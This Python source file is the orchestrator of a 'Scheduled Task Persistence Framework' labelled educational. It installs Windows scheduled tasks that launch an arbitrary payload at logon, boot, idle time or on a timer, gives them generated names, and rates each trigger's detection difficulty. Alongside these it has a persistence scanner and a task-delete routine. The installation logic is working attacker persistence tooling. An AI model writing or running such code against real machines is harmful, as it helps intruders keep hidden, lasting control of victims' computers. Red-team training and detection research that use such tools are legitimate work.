"""
Main orchestrator for Scheduled Task Persistence Framework
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import check_admin, generate_task_name
from config import TRIGGER_TYPES
from triggers.logon import LogonTrigger
from triggers.schedule import ScheduleTrigger
from triggers.idle import IdleTrigger
from triggers.boot import BootTrigger
from triggers.multi import MultiTrigger
from detection.scanner import TaskScanner


class ScheduledTaskOrchestrator:
    """Main coordinator for scheduled task operations"""
    
    def __init__(self):
        self.is_admin = check_admin()
        self.trigger_info = TRIGGER_TYPES
        
        # Initialize trigger handlers
        self.logon = LogonTrigger()
        self.schedule = ScheduleTrigger()
        self.idle = IdleTrigger()
        self.boot = BootTrigger()
        self.multi = MultiTrigger()
        
        # Initialize scanner
        self.scanner = TaskScanner()
        
        # Track installed tasks
        self.installed_tasks = []
    
    def display_banner(self):
        """Display framework banner"""
        banner = """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║        SCHEDULED TASK PERSISTENCE FRAMEWORK               ║
║               Educational Use Only                        ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
"""
        print(banner)
        
        if self.is_admin:
            print("[+] Running with Administrator privileges")
        else:
            print("[!] Running with standard user privileges")
            print("    (Some triggers require Administrator)")
        print()
    
    def list_triggers(self):
        """Display all available trigger types"""
        print("\n" + "="*60)
        print("AVAILABLE TRIGGER TYPES")
        print("="*60 + "\n")
        
        for trigger_id, info in self.trigger_info.items():
            admin_req = "Yes" if info['requires_admin'] else "No"
            
            print(f"[{trigger_id.upper()}]")
            print(f"  Name: {info['name']}")
            print(f"  Description: {info['description']}")
            print(f"  Admin Required: {admin_req}")
            print(f"  Detection: {info['detection_difficulty']}")
            print(f"  Survives Reboot: {info['survives_reboot']}")
            print()
    
    def create_task(self, trigger_type, payload_path, task_name=None, **kwargs):
        """
        Create a scheduled task with specified trigger
        
        Args:
            trigger_type (str): Type of trigger
            payload_path (str): Path to payload
            task_name (str): Custom task name
            **kwargs: Additional trigger-specific arguments
            
        Returns:
            dict: Creation result
        """
        if task_name is None:
            task_name = generate_task_name()
        
        print(f"\n[*] Creating task: {task_name}")
        print(f"[*] Trigger type: {trigger_type}")
        print("="*60)
        
        result = None
        
        if trigger_type == 'logon':
            result = self.logon.create(task_name, payload_path)
        
        elif trigger_type == 'schedule_interval':
            interval = kwargs.get('interval', 10)
            result = self.schedule.create_interval(task_name, payload_path, interval)
        
        elif trigger_type == 'schedule_daily':
            time = kwargs.get('time', '02:00')
            result = self.schedule.create_daily(task_name, payload_path, time)
        
        elif trigger_type == 'schedule_hourly':
            result = self.schedule.create_hourly(task_name, payload_path)
        
        elif trigger_type == 'schedule_weekly':
            day = kwargs.get('day', 'MON')
            time = kwargs.get('time', '02:00')
            result = self.schedule.create_weekly(task_name, payload_path, day, time)
        
        elif trigger_type == 'idle':
            idle_minutes = kwargs.get('idle_minutes', 10)
            result = self.idle.create(task_name, payload_path, idle_minutes)
        
        elif trigger_type == 'boot':
            result = self.boot.create(task_name, payload_path)
        
        elif trigger_type == 'multi':
            result = self.multi.create(task_name, payload_path)
        
        else:
            print(f"[!] Unknown trigger type: {trigger_type}")
            return None
        
        if result:
            self.installed_tasks.append(result)
        
        return result
    
    def scan_existing(self):
        """Scan for existing persistence"""
        return self.scanner.scan_all()
    
    def delete_task(self, task_name):
        """Delete a scheduled task"""
        from core.utils import run_command
        
        print(f"[*] Deleting task: {task_name}")
        command = f'schtasks /Delete /TN "{task_name}" /F'
        result = run_command(command)
        
        if result['success']:
            print(f"[+] Task deleted: {task_name}")
            return True
        else:
            print(f"[-] Failed to delete task")
            return False